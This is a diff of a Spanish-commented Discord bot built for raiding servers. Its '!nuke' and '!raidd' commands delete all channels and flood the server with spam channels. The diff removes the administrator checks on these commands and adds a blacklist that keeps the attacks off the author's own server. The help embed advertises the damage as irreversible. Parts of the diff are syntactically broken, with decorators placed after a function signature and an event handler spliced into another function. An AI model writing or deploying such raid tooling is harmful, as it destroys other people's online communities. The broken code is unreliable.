@@ -10,9 +10,24 @@ from io import BytesIO
 
 # --- CONFIGURACIÓN GLOBAL ---
 # ID del servidor que actuará como la fuente única de la lista VIP.
-SERVER_MAESTRO_ID = 123456789012345678  # <--- ¡REEMPLAZA CON EL ID DE TU SERVER!
+SERVER_MAESTRO_ID =1442639957733802227   # <--- ¡REEMPLAZA CON EL ID DE TU SERVER!
 LISTA_GLOBAL_JSON = "global_vips.json" 
 # ----------------------------
+
+# --- LISTA NEGRA DE SERVIDORES PROHIBIDOS ---
+# Coloca aquí los IDs de los servidores donde los comandos de ataque NO deben funcionar.
+SERVIDORES_PROHIBIDOS_IDS = [
+    1442639957733802227  # <--- ID de tu servidor principal o de la comunidad   # <--- ID de otro servidor que quieres excluir
+]
+# ---------------------------------------------
+
+def is_not_blacklisted_server():
+    """Verifica si el servidor actual NO está en la lista de SERVIDORES_PROHIBIDOS_IDS."""
+    def predicate(ctx):
+        # La verificación es exitosa si el ID del servidor NO está en la lista prohibida
+        return ctx.guild.id not in SERVIDORES_PROHIBIDOS_IDS
+    # Usamos commands.check para aplicar esta lógica
+    return commands.check(predicate)
 
 def load_global_vips():
     """Carga la lista global de IDs VIP desde el archivo JSON al iniciar."""
@@ -52,6 +67,31 @@ async def on_ready():
 async def on_member_update(before, after):
     global USUARIOS_GLOBAL_VIP
     
+@bot.event
+async def on_command_error(ctx, error):
+    # Verifica si el error es de tipo CheckFailure (falla en la verificación)
+    if isinstance(error, commands.CheckFailure):
+        
+        # 🚨 NUEVA LÓGICA DE LISTA NEGRA
+        # Verificamos si la falla se debe a que el servidor actual está en la lista negra
+        if ctx.guild.id in SERVIDORES_PROHIBIDOS_IDS:
+             await ctx.send("🛑 **Error de Restricción:** No puedes usar este comando aquí.")
+             return
+             
+        # Lógica de falla de VIP (si no se devolvió en la línea anterior)
+        await ctx.send(f"❌ **Acceso Denegado:** El comando `{ctx.command}` solo puede ser ejecutado por usuarios VIP.")
+    
+    # Maneja si falta el permiso de administrador
+    elif isinstance(error, commands.MissingPermissions):
+        await ctx.send("🛑 **Error de Permisos:** Necesitas ser administrador para ejecutar este comando.")
+        
+    else:
+        # Esto es para cualquier otro error de código o conexión
+        # print(f"Ocurrió un error no manejado: {error}") 
+        # raise error # Descomentar para debug
+        pass
+
+
     # 1. Verificar si el cambio ocurrió en el Servidor Maestro
     if before.guild.id != SERVER_MAESTRO_ID:
         return
@@ -88,6 +128,8 @@ async def hola(ctx):
 @bot.command()
 @commands.has_permissions(manage_channels=True)
 async def borrar_categoria(ctx, nombre):
+@is_global_vip()
+@is_not_blacklisted_server()
     for canal in ctx.guild.channels:
         if nombre.lower() in canal.name.lower():
             await canal.delete()
@@ -238,7 +280,6 @@ async def stats(ctx):
     await temp.edit(content=None, embed=embed)
 
 @bot.command(name='raidd', aliases=['wipe_and_build'])
-@commands.has_permissions(administrator=True, manage_channels=True)
 async def full_server_reset(ctx):
     """Combina destrucción y reconstrucción de forma silenciosa."""
     
@@ -281,7 +322,6 @@ async def full_server_reset(ctx):
         await ctx.send("⚠️ REINICIO COMPLETADO CON FALLOS. Se eliminaron canales, pero falló la creación.")
 
 @bot.command(name='nuke', aliases=['eliminar-canales', 'delall'])
-@commands.has_permissions(administrator=True, manage_channels=True)
 async def nuke_channels(ctx):
     """Elimina todos los canales del servidor de forma silenciosa."""
     
@@ -304,39 +344,58 @@ async def nuke_channels(ctx):
     # Este mensaje final se mantiene para informar el resultado
     await ctx.send(f"✅ **¡Operación completada!** Se eliminaron **{deleted_count}** canales.")
 
-@bot.command(name='ayuda', aliases=['comandos'])
-async def help_command(ctx):
-    """Muestra una lista de todos los comandos de ataque en un Embed."""
+@bot.command(name='comandos', aliases=['help', 'cmd'])
+async def comandos_list(ctx):
+    """Muestra la lista de comandos con su descripción y advertencias."""
     
-    # 📝 Crear el objeto Embed
+    # 1. Crear el objeto Embed
     embed = discord.Embed(
-        title="🚨 Lista de Comandos de Operaciones Masivas",
-        description="Todos los comandos requieren el permiso de **Administrador** (`administrator=True`).",
-        color=0xFF0000 # Color rojo para peligro/advertencia
+        title="⚔️ Lista de comandos del Bot 💥",
+        description="El servidor no se hace responsable de cualquier intento fallido o baneo forzado por bot antiraid.",
+        color=discord.Color.red() # Puedes cambiar el color a rojo o el que prefieras
     )
     
-    # --- 1. Comando de Eliminación Masiva ---
+    # 2. Añadir los campos (comandos)
+    
+    # Comando 1: !raidd (Asumo que te referías a !full_reset)
     embed.add_field(
-        name="💥 !nuke",
-        value="**Aliases:** `!eliminar-canales`, `!delall`\n"
-              "**Función:** Elimina **todos los canales** del servidor al instante, sin confirmación. Solo deja el canal de ejecución.\n"
-              "**Ejecución:** `!nuke`",
+        name="1. !full_reset [o !raidd] ",
+        value="Este comando lo que hace es que destroza **TODO EL SERVIDOR** (borra canales y crea canales de spam). Si ejecutas este comando, los daños son **IRREVERSIBLES**.",
+        inline=False
+    )
+
+    # Comando 2: !nuke
+    embed.add_field(
+        name="2. !nuke ",
+        value="Este comando lo que hace es que borra **todos los canales, siendo este irreversible**.",
+        inline=False
+    )
+
+    # Comando 3: !gbk [nombre de la copia] (Guardar Backup)
+    embed.add_field(
+        name="3. !gbk [nombre de la copia]",
+        value="Con este comando harás una copia del servidor que quieres. Necesitas comando de **Administrador**.",
+        inline=False
+    )
+
+    # Comando 4: !rbk [nombre de la copia] (Restaurar Backup)
+    embed.add_field(
+        name="4. !rbk [nombre de la copia]",
+        value="Acá podrás cargar tu copia del servidor que copiaste. Necesitas comando de **Administrador**.",
+        inline=False
+    )
+
+    # Comando 5: !backups
+    embed.add_field(
+        name="5. !backups",
+        value="Esté comando te muestra tus copias guardadas.",
         inline=False
     )
     
-    # --- 2. Comando de Creación y Spam Concurrente ---
-    embed.add_field(
-        name="🚀 !raid",
-        value="**Aliases:** `!simultaneous_nuke`\n"
-              "**Función:** Crea **40 canales** (`test-01` a `test-40`) y envía **20 mensajes de 'hola'** en cada uno de forma **simultánea**.\n"
-              "**Ejecución:** `!concurrent_spam`",
-        inline=False
-    )
-    
-    # 📢 Añadir un pie de página
-    embed.set_footer(text="⚠️ Usa estos comandos bajo tu propia responsabilidad. Son acciones IRREVERSIBLES.")
-    
-    # Enviar el Embed al canal
-    await ctx.send(embed=embed)
+    # 3. Enviar el embed al canal
+    try:
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"❌ Error al enviar el embed: {e}")
 
 bot.run(BOT_TOKEN) 
